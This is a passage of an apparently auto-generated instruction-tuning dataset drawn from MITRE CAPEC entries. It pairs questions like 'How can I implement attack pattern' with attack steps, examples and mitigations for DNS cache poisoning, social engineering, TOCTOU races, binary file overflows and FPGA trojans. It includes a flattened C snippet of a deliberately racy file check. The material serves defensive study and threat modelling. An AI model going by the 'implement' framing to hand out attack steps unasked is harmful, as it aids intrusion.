        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "1259"
            },
            {
              "@CWE_ID": "1267"
            },
            {
              "@CWE_ID": "1270"
            },
            {
              "@CWE_ID": "1294"
            },
            {
              "@CWE_ID": "1302"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-694"
            },
            {
              "@External_Reference_ID": "REF-695"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-10-21"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Cache Poisoning (CAPEC ID: 141)",
    "context": "",
    "output": "Possible examples: In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.\n* Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com\n* When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.",
        "Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com",
        "When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack."
      ],
      "@Name": "Cache Poisoning (CAPEC ID: 141)",
      "attack_ptrn": {
        "@ID": "141",
        "@Name": "Cache Poisoning",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker exploits the functionality of cache technologies to cause specific data to be cached that aids the attackers' objectives. This describes any attack whereby an attacker places incorrect or harmful material in cache. The targeted cache can be an application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache). Until the cache is refreshed, most applications or clients will treat the corrupted cache value as valid. This can lead to a wide range of exploits including redirecting web browsers towards sites that install malware and repeatedly incorrect calculations based on the incorrect value.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "161",
            "Exclude_Related": [
              {
                "@Exclude_ID": "512"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify and explore caches] Use tools to sniff traffic and scan a network in order to locate application's cache (e.g. a web browser cache) or a public cache (e.g. a DNS or ARP cache) that may have vulnerabilities. Look for poisoning point in cache table entries.",
              "Technique": "Run tools that check available entries in the cache."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause specific data to be cached] An attacker sends bogus request to the target, and then floods responses that trick a cache to remember malicious responses, which are wrong answers of queries.",
              "Technique": "Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID)."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Redirect users to malicious website] As the attacker succeeds in exploiting the vulnerability, they are able to manipulate and interpose malicious response data to targeted victim queries.",
              "Technique": [
                "Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).",
                "Adversary-in-the-Middle attacks (CAPEC-94) intercept secure communication between two parties."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The attacker must be able to modify the value stored in a cache to match a desired value.",
            "The targeted application must not be able to detect the illicit modification of the cache and must trust the cache value in its calculations."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To overwrite/modify targeted cache"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Configuration: Disable client side caching.",
            "Implementation: Listens for query replies on a network, and sends a notification via email when an entry changes."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "In this example, an attacker sends request to a local DNS server to look up www.example .com. The associated IP address of www.example.com is 1.3.5.7.",
              "Local DNS usually caches IP addresses and do not go to remote DNS every time. Since the local record is not found, DNS server tries to connect to remote DNS for queries. However, before the remote DNS returns the right IP address 1.3.5.7, the attacker floods local DNS with crafted responses with IP address 2.4.6.8. The result is that 2.4.6.8 is stored in DNS cache. Meanwhile, 2.4.6.8 is associated with a malicious website www.maliciousexampsle.com",
              "When users connect to www.example.com, the local DNS will direct it to www.maliciousexample.com, this works as part of a Pharming attack."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "348"
            },
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "349"
            },
            {
              "@CWE_ID": "346"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1557.002",
              "Entry_Name": "Adversary-in-the-Middle: ARP Cache Poisoning"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Cache Poisoning"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-22",
              "@Section": "DNS Cache Poisoning"
            },
            {
              "@External_Reference_ID": "REF-23",
              "@Section": "DNS Threats & Weaknesses of the Domain Name System"
            },
            {
              "@External_Reference_ID": "REF-24",
              "@Section": "Arp Spoofing"
            },
            {
              "@External_Reference_ID": "REF-599",
              "@Section": "Testing for Browser Cache Weaknesses"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Related_Weaknesses, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Influence Perception of Reciprocation (CAPEC ID: 418)",
    "context": "",
    "output": "Possible examples: An adversary develops a relationship with the target to foster a feeling of obligation in them to perform a certain action or concede some information. A perception of obligation/concession means that the target feels they need to behave in some way or perform some sort of action due to being morally or legally bound to do so.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary develops a relationship with the target to foster a feeling of obligation in them to perform a certain action or concede some information. A perception of obligation/concession means that the target feels they need to behave in some way or perform some sort of action due to being morally or legally bound to do so.",
      "@Name": "Influence Perception of Reciprocation (CAPEC ID: 418)",
      "attack_ptrn": {
        "@ID": "418",
        "@Name": "Influence Perception of Reciprocation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary uses a social engineering techniques to produce a sense of obligation in the target to perform a certain action or concede some sensitive or key piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. There are various techniques for fostering a sense of obligation to reciprocate or concede during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "417"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary must have the means and knowledge of how to communicate with the target in some manner."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "The adversary requires strong inter-personal and communication skills."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Other",
            "Note": "Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system."
          }
        },
        "Mitigations": {
          "Mitigation": "An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks."
        },
        "Example_Instances": {
          "Example": "An adversary develops a relationship with the target to foster a feeling of obligation in them to perform a certain action or concede some information. A perception of obligation/concession means that the target feels they need to behave in some way or perform some sort of action due to being morally or legally bound to do so."
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-348"
            },
            {
              "@External_Reference_ID": "REF-360"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2017-08-04",
            "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, References, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
          },
          "Previous_Entry_Name": {
            "@Date": "2017-08-04",
            "#text": "Target Influence via Perception of Obligation"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions (CAPEC ID: 29)",
    "context": "",
    "output": "Examples of Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions (CAPEC ID: 29) are: The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057"
      ],
      "@Name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions (CAPEC ID: 29)",
      "attack_ptrn": {
        "@ID": "29",
        "@Name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by \"running the race\", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "26",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "The adversary explores to gauge what level of access they have."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "The adversary decides to leverage the race condition by \"running the race\", meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "A resource is access/modified concurrently by multiple processes.",
            "The adversary is able to modify resource.",
            "A race condition exists while accessing a resource."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "This attack can get sophisticated since the attack has to occur within a short interval of time."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Alter Execution Logic"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use safe libraries to access resources such as files.",
            "Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.",
            "Use synchronization to control the flow of execution.",
            "Use static analysis tools to find race conditions.",
            "Pay attention to concurrency problems related to the access of resources."
          ]
        },
        "Example_Instances": {
          "Example": [
            "The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057",
            {
              "xhtml:p": [
                "The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an adversary can replace the file referenced by the name.",
                "[REF-107]"
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "bad",
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null,
                  null
                ],
                "xhtml:div": [
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:br": [
                      null,
                      null,
                      null,
                      null
                    ],
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "#text": "return;"
                    },
                    "#text": "int fd;fd = creat(FILE, 0644);if(fd == -1)\n                     chown(FILE, UID, -1); /* BAD */close(fd);"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:br": [
                      null,
                      null,
                      null
                    ],
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "userstr = argv[1];test(userstr);"
                    },
                    "#text": "char *userstr;if(argc > 1) {\n                     }return 0;"
                  }
                ],
                "#text": "include <sys/types.h>include <fcntl.h>include <unistd.h>\n                  define FILE \"/tmp/myfile\"define UID 100\n                  void test(char *str){\n                  }\n                  int main(int argc, char **argv){\n                  }"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "367"
            },
            {
              "@CWE_ID": "368"
            },
            {
              "@CWE_ID": "366"
            },
            {
              "@CWE_ID": "370"
            },
            {
              "@CWE_ID": "362"
            },
            {
              "@CWE_ID": "662"
            },
            {
              "@CWE_ID": "691"
            },
            {
              "@CWE_ID": "663"
            },
            {
              "@CWE_ID": "665"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-131"
            },
            {
              "@External_Reference_ID": "REF-107",
              "@Section": "Test Case ID 1598"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Overflow Binary Resource File (CAPEC ID: 44)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Overflow Binary Resource File (CAPEC ID: 44) are: Binary files like music and video files are appended with additional data to cause buffer overflow on target systems. Because these files may be filled with otherwise popular content, the adversary has an excellent vector for wide distribution. There have been numerous cases, for example of malicious screen savers for sports teams that are distributed on the event of the team winning a championship.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Binary files like music and video files are appended with additional data to cause buffer overflow on target systems. Because these files may be filled with otherwise popular content, the adversary has an excellent vector for wide distribution. There have been numerous cases, for example of malicious screen savers for sports teams that are distributed on the event of the team winning a championship.",
      "@Name": "Overflow Binary Resource File (CAPEC ID: 44)",
      "attack_ptrn": {
        "@ID": "44",
        "@Name": "Overflow Binary Resource File",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attack of this type exploits a buffer overflow vulnerability in the handling of binary resources. Binary resources may include music files like MP3, image files like JPEG files, and any other binary file. These attacks may pass unnoticed to the client machine through normal usage of files, such as a browser loading a seemingly innocent JPEG file. This can allow the adversary access to the execution stack and execute arbitrary code in the target process.",
        "Extended_Description": "This attack pattern is a variant of standard buffer overflow attack using an unexpected vector (binary files) to wrap its attack and open up a new attack vector. The adversary is required to either directly serve the binary content to the victim, or place it in a locale like a MP3 sharing application for the victim to download. The adversary then is notified upon the download or otherwise locates the vulnerability opened up by the buffer overflow.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "100"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "23"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target software] The adversary identifies software that uses external binary files in some way. This could be a file upload, downloading a file from a shared location, or other means."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find injection vector] The adversary creates a malicious binary file by altering the header to make the file seem shorter than it is. Additional bytes are added to the end of the file to be placed in the overflowed location. The adversary then deploys the file to the software to determine if a buffer overflow was successful."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] Once the adversary has determined that this attack is viable, they will specially craft the binary file in a way that achieves the desired behavior. If the source code is available, the adversary can carefully craft the malicious file so that the return address is overwritten to an intended value. If the source code is not available, the adversary will iteratively alter the file in order to overwrite the return address correctly.",
              "Technique": [
                "Create malicious shellcode that will execute when the program execution is returned to it.",
                "Use a NOP-sled in the overflow content to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Once the adversary has constructed a file that will effectively overflow the targeted software in the intended way. The file is deployed to the software, either by serving it directly to the software or placing it in a shared location for a victim to load into the software."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Target software processes binary resource files.",
            "Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "To modify file, deceive client into downloading, locate and exploit remote stack or heap vulnerability"
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Perform appropriate bounds checking on all buffers.",
            "Design: Enforce principle of least privilege",
            "Design: Static code analysis",
            "Implementation: Execute program in less trusted process space environment, do not allow lower integrity processes to write to higher integrity processes",
            "Implementation: Keep software patched to ensure that known vulnerabilities are not available for adversaries to target on host."
          ]
        },
        "Example_Instances": {
          "Example": "Binary files like music and video files are appended with additional data to cause buffer overflow on target systems. Because these files may be filled with otherwise popular content, the adversary has an excellent vector for wide distribution. There have been numerous cases, for example of malicious screen savers for sports teams that are distributed on the event of the team winning a championship."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "119"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Design for FPGA Maliciously Altered (CAPEC ID: 674)",
    "context": "",
    "output": "Examples of Design for FPGA Maliciously Altered (CAPEC ID: 674) are: An adversary with access and the ability to alter the configuration/programming of FPGAs in organizational systems, introduces a trojan backdoor that can be used to alter the behavior of the original system resulting in, for example, compromise of confidentiality of data being processed.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An adversary with access and the ability to alter the configuration/programming of FPGAs in organizational systems, introduces a trojan backdoor that can be used to alter the behavior of the original system resulting in, for example, compromise of confidentiality of data being processed.",
      "@Name": "Design for FPGA Maliciously Altered (CAPEC ID: 674)",
      "attack_ptrn": {
        "@ID": "674",
        "@Name": "Design for FPGA Maliciously Altered",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": "An adversary alters the functionality of a field-programmable gate array (FPGA) by causing an FPGA configuration memory chip reload in order to introduce a malicious function that could result in the FPGA performing or enabling malicious functions on a host system. Prior to the memory chip reload, the adversary alters the program for the FPGA by adding a function to impact system operation."
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "447"
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary would need to have access to FPGA programming/configuration-related systems in a chip maker\u2019s development environment where FPGAs can be initially configured prior to delivery to a customer or have access to such systems in a customer facility where end-user FPGA configuration/reconfiguration can be performed."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "An adversary would need to be skilled in FPGA programming in order to create/manipulate configurations in such a way that when loaded into an FPGA, the end user would be able to observe through testing all user-defined required functions but would be unaware of any additional functions the adversary may have introduced."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Alter Execution Logic"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Utilize DMEA\u2019s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.",
            "Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management including for FPGA programming and program uploads to FPGA chips.",
            "Require that provenance of COTS microelectronic components be known whenever procured.",
            "Conduct detailed vendor assessment before acquiring COTS hardware."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "An adversary with access and the ability to alter the configuration/programming of FPGAs in organizational systems, introduces a trojan backdoor that can be used to alter the behavior of the original system resulting in, for example, compromise of confidentiality of data being processed."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-660"
            },
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-662"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-06-24"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Block Access to Libraries (CAPEC ID: 96)",
    "context": "",
    "output": "Possible examples: A web-based system uses a third party cryptographic random number generation library that derives entropy from machine's hardware. This library is used in generation of user session ids used by the application. If the library is inaccessible, the application instead uses a software based weak pseudo random number generation library. An attacker of the system blocks access of the application to the third party cryptographic random number generation library (by renaming it). The application in turn uses the weak pseudo random number generation library to generate session ids that are predictable. An attacker then leverages this weakness to guess a session id of another user to perform a horizontal elevation of privilege escalation and gain access to another user's account.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A web-based system uses a third party cryptographic random number generation library that derives entropy from machine's hardware. This library is used in generation of user session ids used by the application. If the library is inaccessible, the application instead uses a software based weak pseudo random number generation library. An attacker of the system blocks access of the application to the third party cryptographic random number generation library (by renaming it). The application in turn uses the weak pseudo random number generation library to generate session ids that are predictable. An attacker then leverages this weakness to guess a session id of another user to perform a horizontal elevation of privilege escalation and gain access to another user's account.",
      "@Name": "Block Access to Libraries (CAPEC ID: 96)",
      "attack_ptrn": {
        "@ID": "96",
        "@Name": "Block Access to Libraries",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. It is possible that the application does not handle situations properly where access to these libraries has been blocked. Depending on the error handling within the application, blocked access to libraries may leave the system in an insecure state that could be leveraged by an attacker.",
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "603",
            "Exclude_Related": {
              "@Exclude_ID": "512"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Determine what external libraries the application accesses."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "Block access to the external libraries accessed by the application."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "Monitor the behavior of the system to see if it goes into an insecure/inconsistent state."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "If the system does go into an insecure/inconsistent state, leverage that to obtain information about the system functionality or data, elevate access control, etc. The rest of this attack will depend on the context and the desired goal."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An application requires access to external libraries.",
            "An attacker has the privileges to block application access to external libraries."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Knowledge of how to block access to libraries, as well as knowledge of how to leverage the resulting state of the application based on the failed call."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Alter Execution Logic"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
